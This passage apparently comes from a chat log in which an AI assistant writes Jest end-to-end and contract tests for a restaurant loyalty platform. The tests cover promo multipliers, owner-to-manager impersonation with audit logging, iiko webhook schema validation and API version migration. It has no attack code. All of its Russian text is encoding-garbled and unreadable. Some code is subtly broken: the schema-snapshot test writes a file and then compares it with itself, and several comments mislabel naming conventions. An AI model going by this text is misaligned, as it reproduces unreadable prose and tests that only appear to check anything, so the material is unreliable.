        posCheckId: 'CHK-OUTSIDE',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: outsideRangeDate.toISOString(),
      })
      .expect(200);

    const outsideTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-OUTSIDE' },
    });

    expect(outsideTx.amount).toBe(100); // Normal rate

    jest.useRealTimers();
  });

  // Test: Min check amount condition
  it('should apply promo only for checks >= 5000โฝ', async () => {
    const adminToken = await generateAdminToken('tenant-1');

    await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Big Spender Bonus',
        description: '+50% ะฑะฐะปะปะพะฒ ะทะฐ ัะตะบ ะพั 5000โฝ',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 1.5,
        conditions: {
          minCheckAmount: 5000,
        },
        isActive: true,
      })
      .expect(201);

    // Transaction 6000โฝ (eligible)
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-BIG',
        tenantId: 'tenant-1',
        checkAmount: 6000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const bigTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-BIG' },
    });

    expect(bigTx.amount).toBe(900); // 6000 * 10% * 1.5 = 900

    // Transaction 3000โฝ (not eligible)
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-SMALL',
        tenantId: 'tenant-1',
        checkAmount: 3000,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      });

    const smallTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-SMALL' },
    });

    expect(smallTx.amount).toBe(300); // 3000 * 10% = 300 (normal rate)
  });

  // Test: Multiple promos stacking
  it('should NOT stack multiple promos (highest priority wins)', async () => {
    const adminToken = await generateAdminToken('tenant-1');

    // Promo 1: Double balls Friday (priority 1)
    await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Friday x2',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 2,
        priority: 1,
        conditions: { dayOfWeek: ['Friday'] },
        isActive: true,
      });

    // Promo 2: Triple balls 18-22 (priority 2 - lower)
    await request(app.getHttpServer())
      .post('/api/v1/admin/promos')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({
        name: 'Happy Hour x3',
        startDate: '2026-02-01T00:00:00Z',
        endDate: '2026-02-28T23:59:59Z',
        multiplier: 3,
        priority: 2,
        conditions: { timeRange: { start: '18:00', end: '22:00' } },
        isActive: true,
      });

    // Transaction on Friday at 19:00 (both promos match!)
    const fridayEvening = new Date('2026-02-13T19:00:00+03:00');
    jest.useFakeTimers().setSystemTime(fridayEvening);

    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send({
        posSystem: 'IIKO_CLOUD',
        posCheckId: 'CHK-BOTH',
        tenantId: 'tenant-1',
        checkAmount: 1000,
        guestPhone: '+79991234567',
        timestamp: fridayEvening.toISOString(),
      });

    const tx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-BOTH' },
    });

    // Should apply highest priority promo (x2, not x3)
    expect(tx.amount).toBe(200); // 1000 * 10% * 2
    expect(tx.metadata.promoName).toBe('Friday x2');

    jest.useRealTimers();
  });
});

// Helper function
async function generateAdminToken(tenantId: string): Promise<string> {
  // Create admin user and return JWT token
  const admin = await prisma.user.create({
    data: {
      phone: '+79991111111',
      role: 'ADMIN',
      phoneVerified: true,
      tenant: { connect: { id: tenantId } },
    },
  });

  return jwt.sign(
    { userId: admin.id, role: 'ADMIN', tenantId },
    process.env.JWT_SECRET
  );
}
```


***

### **15. Admin Impersonation Flow - Owner โ Manager view?**

**ะะพะฝัะตะบัั:** Owner ะผะพะถะตั "ะฒะพะนัะธ" ะบะฐะบ Manager ะดะปั troubleshooting.

**ะะพะฟัะพั:** E2E test?

- A) Owner login โ click "Impersonate Manager" โ check UI
- B) A + ะฟัะพะฒะตัะธัั ััะพ Manager ะฒะธะดะธั ัะพะปัะบะพ ัะฒะพะธ ะดะฐะฝะฝัะต
- C) B + ะฟัะพะฒะตัะธัั ััะพ audit log ะทะฐะฟะธัะฐะป impersonation
- D) C + ะฟัะพะฒะตัะธัั "Exit Impersonation" โ Owner view restored

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Impersonation = sensitive feature (security risk ะตัะปะธ ะฝะต ัะตะฐะปะธะทะพะฒะฐะฝ ะฟัะฐะฒะธะปัะฝะพ)
- Audit log ะพะฑัะทะฐัะตะปะตะฝ ะดะปั compliance
- Exit impersonation ะดะพะปะถะตะฝ ัะฐะฑะพัะฐัั ะบะพััะตะบัะฝะพ

**ะะะะะะะะฆะะฏ:**

```typescript
describe('Admin Impersonation Flow (E2E)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.auditLog.deleteMany();
    await prisma.user.deleteMany();
    await prisma.tenant.deleteMany();

    // Create tenant
    const tenant = await prisma.tenant.create({
      data: {
        id: 'tenant-1',
        name: 'Test Restaurant',
        slug: 'test-restaurant',
        status: 'ACTIVE',
      },
    });

    // Create Owner
    await prisma.user.create({
      data: {
        id: 'owner-1',
        phone: '+79991111111',
        email: 'owner@example.com',
        role: 'OWNER',
        phoneVerified: true,
        tenantId: tenant.id,
      },
    });

    // Create Manager
    await prisma.user.create({
      data: {
        id: 'manager-1',
        phone: '+79992222222',
        email: 'manager@example.com',
        role: 'MANAGER',
        phoneVerified: true,
        tenantId: tenant.id,
      },
    });

    // Create Admin
    await prisma.user.create({
      data: {
        id: 'admin-1',
        phone: '+79993333333',
        email: 'admin@example.com',
        role: 'ADMIN',
        phoneVerified: true,
        tenantId: tenant.id,
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  it('should allow Owner to impersonate Manager', async () => {
    // STEP 1: Owner logs in
    const ownerToken = jwt.sign(
      { userId: 'owner-1', role: 'OWNER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Verify Owner can access owner-only endpoint
    const ownerResponse = await request(app.getHttpServer())
      .get('/api/v1/admin/tenants/settings')
      .set('Authorization', `Bearer ${ownerToken}`)
      .expect(200);

    expect(ownerResponse.body.tenantId).toBe('tenant-1');

    // STEP 2: Owner impersonates Manager
    const impersonateResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${ownerToken}`)
      .send({ targetUserId: 'manager-1' })
      .expect(200);

    const impersonationToken = impersonateResponse.body.impersonationToken;

    expect(impersonationToken).toBeTruthy();

    // Decode impersonation token
    const decoded = jwt.verify(impersonationToken, process.env.JWT_SECRET) as any;
    expect(decoded.userId).toBe('manager-1'); // Acting as Manager
    expect(decoded.role).toBe('MANAGER');
    expect(decoded.impersonatedBy).toBe('owner-1'); // But impersonated by Owner
    expect(decoded.isImpersonating).toBe(true);

    // STEP 3: Verify Manager-level access only
    // Manager can access guests
    const guestsResponse = await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(200);

    expect(guestsResponse.body).toBeTruthy();

    // Manager CANNOT access owner-only settings
    await request(app.getHttpServer())
      .get('/api/v1/admin/tenants/settings')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(403); // Forbidden

    // STEP 4: Verify audit log created
    const auditLog = await prisma.auditLog.findFirst({
      where: {
        action: 'IMPERSONATION_STARTED',
        userId: 'owner-1',
      },
    });

    expect(auditLog).toBeTruthy();
    expect(auditLog.metadata).toMatchObject({
      targetUserId: 'manager-1',
      targetRole: 'MANAGER',
    });

    // STEP 5: Exit impersonation
    const exitResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate/exit')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(200);

    const restoredToken = exitResponse.body.originalToken;

    // Verify restored to Owner
    const restoredDecoded = jwt.verify(restoredToken, process.env.JWT_SECRET) as any;
    expect(restoredDecoded.userId).toBe('owner-1');
    expect(restoredDecoded.role).toBe('OWNER');
    expect(restoredDecoded.isImpersonating).toBeUndefined();

    // Owner can access owner-only endpoint again
    await request(app.getHttpServer())
      .get('/api/v1/admin/tenants/settings')
      .set('Authorization', `Bearer ${restoredToken}`)
      .expect(200);

    // STEP 6: Verify exit audit log
    const exitAuditLog = await prisma.auditLog.findFirst({
      where: {
        action: 'IMPERSONATION_ENDED',
        userId: 'owner-1',
      },
    });

    expect(exitAuditLog).toBeTruthy();
  });

  // Test: Manager CANNOT impersonate Owner
  it('should prevent Manager from impersonating Owner', async () => {
    const managerToken = jwt.sign(
      { userId: 'manager-1', role: 'MANAGER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${managerToken}`)
      .send({ targetUserId: 'owner-1' })
      .expect(403); // Forbidden - cannot impersonate higher role
  });

  // Test: Cannot impersonate across tenants
  it('should prevent cross-tenant impersonation', async () => {
    // Create another tenant with Manager
    await prisma.tenant.create({
      data: {
        id: 'tenant-2',
        name: 'Other Restaurant',
        slug: 'other-restaurant',
        status: 'ACTIVE',
      },
    });

    await prisma.user.create({
      data: {
        id: 'manager-2',
        phone: '+79994444444',
        role: 'MANAGER',
        phoneVerified: true,
        tenantId: 'tenant-2',
      },
    });

    const ownerToken = jwt.sign(
      { userId: 'owner-1', role: 'OWNER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Try to impersonate Manager from different tenant
    await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${ownerToken}`)
      .send({ targetUserId: 'manager-2' }) // Different tenant!
      .expect(403);
  });

  // Test: Impersonation banner in UI
  it('should return impersonation info in user profile', async () => {
    const ownerToken = jwt.sign(
      { userId: 'owner-1', role: 'OWNER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const impersonateResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${ownerToken}`)
      .send({ targetUserId: 'manager-1' })
      .expect(200);

    const impersonationToken = impersonateResponse.body.impersonationToken;

    // Get user profile
    const profileResponse = await request(app.getHttpServer())
      .get('/api/v1/auth/me')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(200);

    expect(profileResponse.body.isImpersonating).toBe(true);
    expect(profileResponse.body.impersonatedBy).toMatchObject({
      id: 'owner-1',
      email: 'owner@example.com',
      role: 'OWNER',
    });
  });

  // Test: Impersonation timeout (security)
  it('should expire impersonation token after 1 hour', async () => {
    const ownerToken = jwt.sign(
      { userId: 'owner-1', role: 'OWNER', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const impersonateResponse = await request(app.getHttpServer())
      .post('/api/v1/admin/impersonate')
      .set('Authorization', `Bearer ${ownerToken}`)
      .send({ targetUserId: 'manager-1' })
      .expect(200);

    const impersonationToken = impersonateResponse.body.impersonationToken;

    // Simulate 2 hours later
    jest.useFakeTimers().setSystemTime(Date.now() + 2 * 60 * 60 * 1000);

    // Token should be expired
    await request(app.getHttpServer())
      .get('/api/v1/admin/guests')
      .set('Authorization', `Bearer ${impersonationToken}`)
      .expect(401); // Unauthorized - token expired

    jest.useRealTimers();
  });
});
```


***

## **ะะะะ 4: CONTRACT TESTING (5 ะฒะพะฟัะพัะพะฒ)**


***

### **16. POS Webhook Schema - contract tests?**

**ะะพะฝัะตะบัั:** iiko ะผะพะถะตั ะธะทะผะตะฝะธัั webhook schema ะฑะตะท ะฟัะตะดัะฟัะตะถะดะตะฝะธั.

**ะะพะฟัะพั:** ะะฐะบ ะทะฐัะธัะธัััั?

- A) ะะฐะดะตััััั ััะพ ะฝะต ะธะทะผะตะฝัั
- B) Contract tests (Pact): ะฟัะพะฒะตัะธัั ััะพ schema ะฝะต ะธะทะผะตะฝะธะปัั
- C) B + automated alerts ะตัะปะธ schema ะธะทะผะตะฝะธะปัั
- D) C + backward compatibility layer (ะฟะพะดะดะตัะถะบะฐ ััะฐััั ะฒะตััะธะน)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- External APIs ะผะตะฝััััั ะฑะตะท ะฟัะตะดัะฟัะตะถะดะตะฝะธั
- Contract tests ะปะพะฒัั breaking changes ะดะพ production
- Backward compatibility ะบัะธัะธัะฝะฐ ะดะปั ะฟะปะฐะฒะฝะพะน ะผะธะณัะฐัะธะธ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/contract/pos-webhook.contract.spec.ts
import { Verifier } from '@pact-foundation/pact';
import * as path from 'path';

describe('POS Webhook Contract Tests', () => {
  // Schema for iiko Cloud API v2.0 webhook
  const iikoWebhookSchema = {
    type: 'object',
    required: ['orderId', 'organizationId', 'orderDate', 'orderSum'],
    properties: {
      orderId: { type: 'string', format: 'uuid' },
      organizationId: { type: 'string', format: 'uuid' },
      orderDate: { type: 'string', format: 'date-time' },
      orderSum: { type: 'number', minimum: 0 },
      customer: {
        type: 'object',
        properties: {
          phone: { type: 'string', pattern: '^\\+7\\d{10}$' },
          cardNumber: { type: 'string' },
          guestId: { type: 'string', format: 'uuid' },
        },
      },
      items: {
        type: 'array',
        items: {
          type: 'object',
          required: ['productId', 'productName', 'price', 'quantity', 'sum'],
          properties: {
            productId: { type: 'string', format: 'uuid' },
            productName: { type: 'string' },
            categoryId: { type: 'string', format: 'uuid' },
            categoryName: { type: 'string' },
            price: { type: 'number', minimum: 0 },
            quantity: { type: 'number', minimum: 1 },
            sum: { type: 'number', minimum: 0 },
          },
        },
      },
      payments: {
        type: 'array',
        items: {
          type: 'object',
          required: ['paymentType', 'sum'],
          properties: {
            paymentType: { 
              type: 'string',
              enum: ['CASH', 'CARD', 'ONLINE'],
            },
            sum: { type: 'number', minimum: 0 },
          },
        },
      },
      terminalGroupId: { type: 'string', format: 'uuid' },
      createdAt: { type: 'string', format: 'date-time' },
      closedAt: { type: 'string', format: 'date-time' },
    },
  };

  it('should validate iiko webhook against schema', () => {
    const Ajv = require('ajv');
    const ajv = new Ajv({ allErrors: true });
    
    const validate = ajv.compile(iikoWebhookSchema);

    // Valid webhook
    const validWebhook = {
      orderId: '550e8400-e29b-41d4-a716-446655440000',
      organizationId: '660e8400-e29b-41d4-a716-446655440001',
      orderDate: '2026-02-12T14:30:00Z',
      orderSum: 2850,
      customer: {
        phone: '+79991234567',
        cardNumber: '000001',
      },
      items: [
        {
          productId: '770e8400-e29b-41d4-a716-446655440002',
          productName: 'Burger',
          categoryId: '880e8400-e29b-41d4-a716-446655440003',
          categoryName: 'Main Dishes',
          price: 500,
          quantity: 2,
          sum: 1000,
        },
      ],
      payments: [
        { paymentType: 'CARD', sum: 2850 },
      ],
      terminalGroupId: '990e8400-e29b-41d4-a716-446655440004',
      createdAt: '2026-02-12T14:30:00Z',
      closedAt: '2026-02-12T14:35:00Z',
    };

    const valid = validate(validWebhook);
    expect(valid).toBe(true);
  });

  it('should detect schema violations', () => {
    const Ajv = require('ajv');
    const ajv = new Ajv({ allErrors: true });
    const validate = ajv.compile(iikoWebhookSchema);

    // Invalid: missing required field
    const invalidWebhook = {
      orderId: '550e8400-e29b-41d4-a716-446655440000',
      // organizationId: missing!
      orderDate: '2026-02-12T14:30:00Z',
      orderSum: 2850,
    };

    const valid = validate(invalidWebhook);
    expect(valid).toBe(false);
    expect(validate.errors).toContainEqual(
      expect.objectContaining({
        keyword: 'required',
        params: { missingProperty: 'organizationId' },
      })
    );
  });

  it('should detect type changes (breaking change)', () => {
    const Ajv = require('ajv');
    const ajv = new Ajv({ allErrors: true });
    const validate = ajv.compile(iikoWebhookSchema);

    // Invalid: orderSum is string instead of number
    const invalidWebhook = {
      orderId: '550e8400-e29b-41d4-a716-446655440000',
      organizationId: '660e8400-e29b-41d4-a716-446655440001',
      orderDate: '2026-02-12T14:30:00Z',
      orderSum: '2850', // โ String instead of number!
    };

    const valid = validate(invalidWebhook);
    expect(valid).toBe(false);
    expect(validate.errors).toContainEqual(
      expect.objectContaining({
        keyword: 'type',
        params: { type: 'number' },
      })
    );
  });

  // Backward compatibility layer
  it('should handle both v1 and v2 iiko webhooks', async () => {
    const adapter = app.get(IikoWebhookAdapter);

    // v1 webhook (legacy)
    const v1Webhook = {
      CheckId: 'CHK-123', // camelCase
      Amount: 2850,
      GuestPhone: '+79991234567',
      // ... v1 fields
    };

    // v2 webhook (new)
    const v2Webhook = {
      orderId: '550e8400-e29b-41d4-a716-446655440000', // snake_case
      orderSum: 2850,
      customer: {
        phone: '+79991234567',
      },
      // ... v2 fields
    };

    // Both should parse to standardized format
    const parsed1 = await adapter.parseWebhook(v1Webhook);
    const parsed2 = await adapter.parseWebhook(v2Webhook);

    expect(parsed1).toMatchObject({
      posCheckId: 'CHK-123',
      checkAmount: 2850,
      guestPhone: '+79991234567',
    });

    expect(parsed2).toMatchObject({
      posCheckId: '550e8400-e29b-41d4-a716-446655440000',
      checkAmount: 2850,
      guestPhone: '+79991234567',
    });
  });

  // Automated monitoring
  it('should save webhook schema snapshots', async () => {
    const fs = require('fs');
    const snapshotPath = path.join(__dirname, '../snapshots/iiko-webhook-schema.json');

    // Save current schema
    fs.writeFileSync(snapshotPath, JSON.stringify(iikoWebhookSchema, null, 2));

    // In CI/CD: compare with previous snapshot
    const previousSchema = JSON.parse(fs.readFileSync(snapshotPath, 'utf8'));

    expect(iikoWebhookSchema).toEqual(previousSchema);
    
    // If different, alert team
    // sendAlert('iiko webhook schema changed!');
  });
});
```

**package.json:**

```json
{
  "devDependencies": {
    "@pact-foundation/pact": "^12.0.0",
    "ajv": "^8.12.0"
  },
  "scripts": {
    "test:contract": "jest --testMatch='**/*.contract.spec.ts'",
    "test:contract:ci": "npm run test:contract && node scripts/check-schema-changes.js"
  }
}
```

**CI/CD script:**

```javascript
// scripts/check-schema-changes.js
const fs = require('fs');
const path = require('path');

const snapshotDir = path.join(__dirname, '../test/snapshots');
const schemas = fs.readdirSync(snapshotDir);

let hasChanges = false;

for (const schema of schemas) {
  const currentPath = path.join(snapshotDir, schema);
  const previousPath = path.join(snapshotDir, `previous-${schema}`);

  if (!fs.existsSync(previousPath)) {
    console.log(`โ New schema detected: ${schema}`);
    continue;
  }

  const current = fs.readFileSync(currentPath, 'utf8');
  const previous = fs.readFileSync(previousPath, 'utf8');

  if (current !== previous) {
    console.error(`โ Schema changed: ${schema}`);
    hasChanges = true;

    // Send alert
    sendSlackAlert(`๐จ POS webhook schema changed: ${schema}`);
  }
}

if (hasChanges) {
  process.exit(1); // Fail CI/CD
}

function sendSlackAlert(message) {
  // Slack webhook implementation
  console.log(`[ALERT] ${message}`);
}
```


***

ะัะพะดะพะปะถะฐั ั ะฒะพะฟัะพัะฐะผะธ **17-20** (ะพััะฐะปัะฝัะต Contract Testing)? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

### **17. API Versioning - breaking changes?**

**ะะพะฝัะตะบัั:** API v1 deprecated, ะฝัะถะฝะพ ะผะธะณัะธัะพะฒะฐัั ะบะปะธะตะฝัะพะฒ ะฝะฐ v2.

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั?

- A) Unit tests ะดะปั v2
- B) Contract tests: v1 ะธ v2 ะฒะพะทะฒัะฐัะฐัั ะพะดะธะฝะฐะบะพะฒัะต ะดะฐะฝะฝัะต
- C) B + automated tests ะดะปั ะพะฑัะฐัะฝะพะน ัะพะฒะผะตััะธะผะพััะธ
- D) C + monitoring: ัะบะพะปัะบะพ ะบะปะธะตะฝัะพะฒ ะตัั ะฝะฐ v1

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- API versioning = ะบัะธัะธัะตะฝ ะดะปั backward compatibility
- Monitoring ะฟะพะผะพะณะฐะตั ะฟะปะฐะฝะธัะพะฒะฐัั deprecation
- Contract tests ะณะฐัะฐะฝัะธัััั ััะพ migration ะฑะตะทะพะฟะฐัะฝะฐ

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/contract/api-versioning.contract.spec.ts
describe('API Versioning - Contract Tests', () => {
  let app: INestApplication;
  let prisma: PrismaClient;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
  });

  beforeEach(async () => {
    await prisma.guestCard.deleteMany();
    await prisma.user.deleteMany();

    // Seed test data
    await prisma.user.create({
      data: {
        id: 'user-1',
        phone: '+79991234567',
        role: 'GUEST',
        phoneVerified: true,
        guestProfile: {
          create: {
            firstName: 'ะะฒะฐะฝ',
            lastName: 'ะะฒะฐะฝะพะฒ',
            birthDate: new Date('1990-01-15'),
          },
        },
        guestCards: {
          create: {
            id: 'card-1',
            tenantId: 'tenant-1',
            totalBalance: 1500,
            totalEarned: 3000,
            totalSpent: 25000,
            qrCode: 'qr-1.png',
            displayCode: '123456',
            status: 'ACTIVE',
          },
        },
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  // Test: v1 and v2 return same data (backward compatibility)
  it('should return compatible data between v1 and v2', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // v1 API response
    const v1Response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // v2 API response
    const v2Response = await request(app.getHttpServer())
      .get('/api/v2/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // v1 format (legacy)
    expect(v1Response.body).toMatchObject({
      balance: 1500,
      earned: 3000,
      spent: 25000,
      card_number: '123456', // snake_case
    });

    // v2 format (new - camelCase)
    expect(v2Response.body).toMatchObject({
      balance: 1500,
      earned: 3000,
      spent: 25000,
      cardNumber: '123456', // camelCase
      // Additional fields in v2
      qrCodeUrl: expect.stringContaining('qr-1.png'),
      status: 'ACTIVE',
    });

    // Core data should be same
    expect(v1Response.body.balance).toBe(v2Response.body.balance);
    expect(v1Response.body.earned).toBe(v2Response.body.earned);
    expect(v1Response.body.spent).toBe(v2Response.body.spent);
  });

  // Test: v2 accepts v1 request format (backward compatibility)
  it('should accept v1 request format in v2 endpoint', async () => {
    const adminToken = jwt.sign(
      { userId: 'admin-1', role: 'ADMIN', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // v1 request format (snake_case)
    const v1Request = {
      guest_phone: '+79998887766',
      first_name: 'ะะตัั',
      last_name: 'ะะตััะพะฒ',
      birth_date: '1985-05-20',
    };

    // v2 should accept v1 format
    const response = await request(app.getHttpServer())
      .post('/api/v2/admin/guests')
      .set('Authorization', `Bearer ${adminToken}`)
      .send(v1Request)
      .expect(201);

    expect(response.body.phone).toBe('+79998887766');
    expect(response.body.firstName).toBe('ะะตัั');
  });

  // Test: v1 deprecated warning header
  it('should return deprecation warning for v1 endpoints', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .expect(200);

    // Check deprecation headers
    expect(response.headers['x-api-version']).toBe('v1');
    expect(response.headers['x-api-deprecated']).toBe('true');
    expect(response.headers['x-api-sunset']).toBe('2026-12-31'); // Deprecation date
    expect(response.headers['link']).toContain('/api/v2/guest/balance'); // Migration link
  });

  // Test: Breaking changes documented
  it('should document breaking changes between versions', async () => {
    const breakingChanges = {
      v1_to_v2: [
        {
          field: 'card_number',
          oldName: 'card_number',
          newName: 'cardNumber',
          type: 'renamed',
          migrationGuide: 'Use cardNumber instead of card_number',
        },
        {
          field: 'transactions',
          oldFormat: 'array',
          newFormat: 'paginated object',
          type: 'structure_changed',
          migrationGuide: 'Use pagination: { data: [], meta: { page, total } }',
        },
        {
          field: 'level',
          removed: true,
          type: 'removed',
          replacement: 'loyaltyLevel',
          migrationGuide: 'Use loyaltyLevel.name instead of level',
        },
      ],
    };

    // Test migration for each breaking change
    for (const change of breakingChanges.v1_to_v2) {
      if (change.type === 'renamed') {
        // Verify both old and new names work in v2 (backward compatibility)
        const token = jwt.sign(
          { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
          process.env.JWT_SECRET
        );

        const response = await request(app.getHttpServer())
          .get('/api/v2/guest/balance')
          .set('Authorization', `Bearer ${token}`)
          .expect(200);

        expect(response.body.cardNumber).toBe('123456'); // New name
        expect(response.body.card_number).toBe('123456'); // Old name still works
      }
    }
  });

  // Test: Monitor API version usage
  it('should track API version usage', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Make 5 requests to v1
    for (let i = 0; i < 5; i++) {
      await request(app.getHttpServer())
        .get('/api/v1/guest/balance')
        .set('Authorization', `Bearer ${token}`);
    }

    // Make 3 requests to v2
    for (let i = 0; i < 3; i++) {
      await request(app.getHttpServer())
        .get('/api/v2/guest/balance')
        .set('Authorization', `Bearer ${token}`);
    }

    // Check metrics
    const metrics = await request(app.getHttpServer())
      .get('/metrics')
      .expect(200);

    const metricsText = metrics.text;

    // Verify v1 usage tracked
    expect(metricsText).toContain('api_requests_total{version="v1",endpoint="/guest/balance"} 5');
    
    // Verify v2 usage tracked
    expect(metricsText).toContain('api_requests_total{version="v2",endpoint="/guest/balance"} 3');
  });

  // Test: Auto-redirect v1 to v2 (optional)
  it('should optionally redirect v1 to v2 with query param', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // v1 with auto-upgrade header
    const response = await request(app.getHttpServer())
      .get('/api/v1/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .set('X-API-Auto-Upgrade', 'true')
      .expect(200);

    // Should return v2 format
    expect(response.body.cardNumber).toBe('123456'); // v2 camelCase
    expect(response.headers['x-api-version-used']).toBe('v2');
  });

  // Test: Version negotiation via Accept header
  it('should support version negotiation via Accept header', async () => {
    const token = jwt.sign(
      { userId: 'user-1', role: 'GUEST', tenantId: 'tenant-1' },
      process.env.JWT_SECRET
    );

    // Request specific version via Accept header
    const v1Response = await request(app.getHttpServer())
      .get('/api/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .set('Accept', 'application/vnd.max-loyalty.v1+json')
      .expect(200);

    expect(v1Response.body.card_number).toBe('123456'); // v1 format

    const v2Response = await request(app.getHttpServer())
      .get('/api/guest/balance')
      .set('Authorization', `Bearer ${token}`)
      .set('Accept', 'application/vnd.max-loyalty.v2+json')
      .expect(200);

    expect(v2Response.body.cardNumber).toBe('123456'); // v2 format
  });
});

// Monitoring dashboard query
describe('API Version Usage Dashboard', () => {
  it('should generate usage report', async () => {
    const report = await prisma.$queryRaw`
      SELECT 
        api_version,
        endpoint,
        COUNT(*) as request_count,
        COUNT(DISTINCT user_id) as unique_users
      FROM api_request_logs
      WHERE created_at >= NOW() - INTERVAL '7 days'
      GROUP BY api_version, endpoint
      ORDER BY request_count DESC
    `;

    console.table(report);

    // Example output:
    // โโโโโโโโโโโฌโโโโโโโโโโโโโโโโโฌโโโโโโโโโโโโโโโโโโฌโโโโโโโโโโโโโโโโ
    // โ version โ endpoint       โ request_count   โ unique_users  โ
    // โโโโโโโโโโโผโโโโโโโโโโโโโโโโโผโโโโโโโโโโโโโโโโโโผโโโโโโโโโโโโโโโโค
    // โ v1      โ /guest/balance โ 15,234          โ 1,523         โ
    // โ v2      โ /guest/balance โ 3,456           โ 345           โ
    // โ v1      โ /guest/history โ 8,901           โ 890           โ
    // โโโโโโโโโโโดโโโโโโโโโโโโโโโโโดโโโโโโโโโโโโโโโโโโดโโโโโโโโโโโโโโโโ

    // Alert if v1 usage still high (> 30%)
    const v1Usage = report.filter(r => r.api_version === 'v1').reduce((sum, r) => sum + r.request_count, 0);
    const v2Usage = report.filter(r => r.api_version === 'v2').reduce((sum, r) => sum + r.request_count, 0);
    const totalUsage = v1Usage + v2Usage;
    const v1Percentage = (v1Usage / totalUsage) * 100;

    if (v1Percentage > 30) {
      console.warn(`โ๏ธ v1 API still used by ${v1Percentage.toFixed(1)}% of requests`);
    }
  });
});
```


***

### **18. Telegram Bot Commands - contract?**

**ะะพะฝัะตะบัั:** Telegram Bot ะฟะพะดะดะตัะถะธะฒะฐะตั ะบะพะผะฐะฝะดั: /start, /balance, /history.

**ะะพะฟัะพั:** Contract tests?

- A) Manual testing ะบะพะผะฐะฝะด
- B) Automated tests: ะพัะฟัะฐะฒะธัั ะบะพะผะฐะฝะดั โ ะฟัะพะฒะตัะธัั ะพัะฒะตั
- C) B + ะฟัะพะฒะตัะธัั schema ะพัะฒะตัะฐ (buttons, inline keyboard)
- D) C + ะฟัะพะฒะตัะธัั ััะพ deprecated ะบะพะผะฐะฝะดั ะฒะพะทะฒัะฐัะฐัั migration notice

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Telegram Bot = user-facing interface (critical for UX)
- Button schema changes = breaking changes
- Deprecated commands ะฝัะถะฝะพ gracefully migrate

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/contract/telegram-bot.contract.spec.ts
